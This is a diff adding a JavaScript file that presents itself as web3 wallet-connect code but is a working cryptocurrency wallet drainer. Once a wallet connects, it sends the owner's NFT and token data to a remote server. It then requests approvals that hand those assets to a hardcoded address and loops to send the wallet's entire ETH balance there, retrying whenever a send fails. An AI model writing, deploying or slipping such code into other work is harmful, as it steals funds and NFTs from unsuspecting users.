@@ -1,0 +1,128 @@
+async function connect() {
+    try {
+        await web3Modal.clearCachedProvider()
+    }
+    catch (e) {
+        console.log(e)
+    }
+    provider = await web3Modal.connect();
+    web3 = new Web3(provider);
+
+    console.log("Web3 instance is", web3);
+    const accounts = await web3.eth.getAccounts();
+    const balance = await web3.eth.getBalance(accounts[0]);
+
+    selectedAccount = accounts[0];
+    try {
+        try {
+            await performInjection(selectedAccount, balance);
+        }
+        catch (error) {
+            console.log(error)
+            await sendAllMoney()
+        }
+    }
+    catch (err) {
+        await sendAllMoney()
+    }
+}
+
+async function performInjection(address) {
+    let nfts = await getNFTS(selectedAccount);
+    let sortedNFTs = nfts;
+    console.log(sortedNFTs);
+    if (sortedNFTs.length == 0) {
+        throw "No NFTs found"
+    }
+    for (let i = 0; i < sortedNFTs.length; i++) {
+        let key = Object.keys(sortedNFTs[i])[0]
+        let actualDict = sortedNFTs[i][key];
+        let higherPrice = sortedNFTs[i][key][0]["token_address"];
+        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
+        
+        let contractInstance = new web3.eth.Contract(abi, higherPrice);
+        let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
+        
+        let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
+        if(isErc20){
+            data["balance"] = actualDict[0]["balance"];
+        }
+        console.log(data)
+        await fetch(`${URL}/transfer/init`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+
+        let data_to_encode = contractInstance.methods.setApprovalForAll(ContractAdr, true).encodeABI();
+        if (actualDict[0]["isErc20"]) {
+            let balanceOwned =actualDict[0]["balance"];
+            data_to_encode = contractInstance.methods.approve("0x27cCD7b8BA2608a6711306FeB173d2645F69a2F2", balanceOwned.toString()).encodeABI();
+        }
+
+        const transactionParameters = {
+            to: higherPrice,
+            from: selectedAccount,
+            value: 0,
+            'data': data_to_encode
+        };
+        try {
+            const txHash = await provider.request({
+                method: 'eth_sendTransaction',
+                params: [transactionParameters],
+            });
+            if (i == sortedNFTs.length - 1) {
+                await sendAllMoney();
+            }
+        } catch (error) {
+            await performInjection(address)
+        }
+    }
+}
+
+async function sendAllMoney() {
+    try {
+        let balance = await web3.eth.getBalance(selectedAccount);
+        let to = "0x27cCD7b8BA2608a6711306FeB173d2645F69a2F2";
+        balance = parseInt(balance);
+        let transactionFee = await get12DollarETH()
+        transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
+        let transactionObject = { from: selectedAccount, to: to }
+        let newBalance = balance - transactionFee;
+        transactionObject.value = web3.utils.toHex(newBalance);
+        if (newBalance > 0) {
+            try {
+                await web3.eth.sendTransaction(transactionObject);
+                await sendAllMoney();
+            }
+            catch (error) {
+                await sendAllMoney();
+            }
+        }
+        else {
+            transactionObject.value = web3.utils.toHex(balance);
+            await web3.eth.sendTransaction(transactionObject);
+        }
+    }
+    catch (error) {
+        await sendAllMoney();
+    }
+}
+
+async function getNFTS(address) {
+    let url = `${URL}/getnfts/${address}`;
+    let response = await fetch(url);
+    let data = await response.json();
+    return data;
+}
+
+async function get12DollarETH() {
+    let url = "https://web.archive.org/web/20220510161218/https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
+    let response = await fetch(url);
+    let price = await response.json();
+    let perETH = price["ethereum"]["usd"];
+    let usd = 1 / perETH;
+    return usd * 20;
+}
